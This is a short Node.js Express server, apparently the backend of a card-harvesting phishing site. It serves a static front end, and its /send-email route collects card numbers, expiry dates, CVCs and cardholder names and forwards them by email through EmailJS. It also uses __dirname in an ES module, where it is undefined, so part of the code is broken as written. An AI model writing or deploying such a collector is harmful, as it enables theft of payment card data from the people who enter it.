import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import emailjs from 'emailjs-com';
import path from 'path'; // ✅ Import path dito

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// --- EmailJS POST route ---
const emailjsUser = process.env.EMAILJS_USER;
const emailjsService = process.env.EMAILJS_SERVICE;
const emailjsTemplate = process.env.EMAILJS_TEMPLATE;
const emailjsKey = process.env.EMAILJS_KEY;

app.post("/send-email", async (req, res) => {
  const { card_number, expiration, cvc, card_name } = req.body;
  const templateParams = { card_number, expiration, cvc, card_name };

  emailjs.send(emailjsService, emailjsTemplate, templateParams, emailjsKey)
    .then((response) => {
      console.log('SUCCESS!', response.status, response.text);
      res.json({ success: true });
    })
    .catch((err) => {
      console.log('FAILED...', err);
      res.status(500).json({ success: false, error: err });
    });
});

// --- MISSING: Static file serving ---
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- Listen ---
const port = process.env.PORT || 10000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
